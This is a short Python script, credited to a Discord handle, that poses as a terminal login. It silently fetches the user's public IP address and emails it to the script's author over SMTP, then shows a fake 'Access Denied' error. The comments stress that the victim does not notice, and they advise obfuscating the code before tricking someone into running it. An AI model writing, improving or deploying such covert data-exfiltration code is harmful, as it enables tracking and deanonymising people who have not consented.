#Imports
import smtplib
import urllib.request
from urllib.request import urlopen
import tkinter
from tkinter import messagebox

#General Code
print("Login into the Terminal.")

input("Username: ")
input("Password: ")

url = ("http://whatismyip.name")
f = urllib.request.urlopen(url) #The website does not visibly open for them. The program is not seen as a virus either. 
storage = f.read()



sender_email = "Sender Email" #You can use the same email in "Sender_email" and "Recieving_email".

rec_email = "Recieving Email"

password = "Sender Password" #This is the sending_emails password. I suggest you obfuscate the code if you are gonna make someone start the program.



server = smtplib.SMTP("SMTP SERVER", SMTP PORT) #SMTP Ports: 25 (DIRECT), 465 (SSL), 587 (TLS)

server.ehlo()
server.starttls() #If you are connecting to a server without TLS, you can remove "server.starttls()".
server.login(sender_email, password)
server.sendmail(sender_email, rec_email, storage)



root = tkinter.Tk()
root.withdraw()


messagebox.showerror("Error: Whitelist", "Access Denied")

#Credits:
#Made by: Tempest#8933
#Improved by: N/A

